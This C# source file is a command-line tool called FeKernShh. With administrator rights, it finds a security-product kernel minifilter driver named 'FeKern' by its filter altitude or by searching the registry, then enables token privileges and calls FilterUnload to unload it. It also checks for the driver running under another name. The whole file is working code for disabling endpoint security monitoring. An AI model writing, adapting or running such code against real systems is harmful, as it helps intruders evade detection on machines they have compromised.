using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;

namespace FeKernShh
{
    class Program
    {
        private static string execName = AppDomain.CurrentDomain.FriendlyName;

        static void Main(string[] args)
        {
            
            if (args.Length < 1)
            {
                Console.WriteLine("[-] Missing args");
                Console.WriteLine("[-] Usage: {0} <hunt|kill>", execName);
                Environment.Exit(1);
            }

            if (args[0] == "hunt" || args[0] == "kill")
            {
                if (!IsAdmin())
                {
                    Console.WriteLine("[-] You need administrator permissions to perform this action");
                    Environment.Exit(1);
                }

                IntPtr currentProcessToken = new IntPtr();
                uint status;
                bool found = false;
                string drvName = "FeKern";
                uint altitudeNum = 388360;
                
                List<FilterParser.FilterInfo> filterInfo = FilterParser.GetFiltersInformation();
                foreach (var filter in filterInfo)
                {
                    if (filter.Altitude.Equals(altitudeNum))
                    {
                        found = true;
                        if (filter.Name.Equals(drvName))
                        {
                            Console.WriteLine("[+] Found the {0} driver running ", drvName);
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                status = Win32.FilterUnload(filter.Name);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                }
                                else
                                {
                                    Console.WriteLine("[+] FeKern was unloaded :)");
                                }
                                
                            }

                        }
                        else
                        {
                            Console.WriteLine("[+] Found the FeKern driver at altitude {0} running with alternate name \"{1}\"", altitudeNum, filter.Name);
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                status = Win32.FilterUnload(filter.Name);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));

                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} was unloaded :)", filter.Name);
                                }
                            }
                        }
                    }
                }
                if (!found)
                {
                    Console.WriteLine("[-] No driver found at altitude {0}. Checking for FeKern running at a different altitude.", altitudeNum);
                    try
                    {
                        //var (altName, altitude) = FilterParser.WalkRegistryKeys(drvName);
                        FilterParser.WalkRegistryKeys(out string altitude, out string altName, ref drvName);

                        if (!string.IsNullOrWhiteSpace(altName) && !string.IsNullOrWhiteSpace(altitude))
                        {
                            Console.WriteLine("[+] Found {0} running as {1} at altitude {2}", drvName, altName, altitude);
                            if (args[0] == "kill")
                            {
                                Console.WriteLine("[+] Trying to kill the driver...");
                                Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
                                Tokens.SetTokenPrivilege(ref currentProcessToken);
                                status = Win32.FilterUnload(altName);
                                if (!status.Equals(0))
                                {
                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} was unloaded :)", altName);
                                }
                            }
                        }
                    }
                    catch (System.Security.SecurityException e)
                    {
                        Console.WriteLine("[-] Exception: {0}", e.Message);
                    }
                }
                else
                {
                    Console.WriteLine("[-] {0} does not appear to be installed", drvName);
                }
            }
            else
            {
                Console.WriteLine("[-] Incorrect args");
                Console.WriteLine("[-] Usage: {0} <hunt|kill>", execName);
            }
        }

        public static bool IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return false;
            }
            return true;
        }
    }
}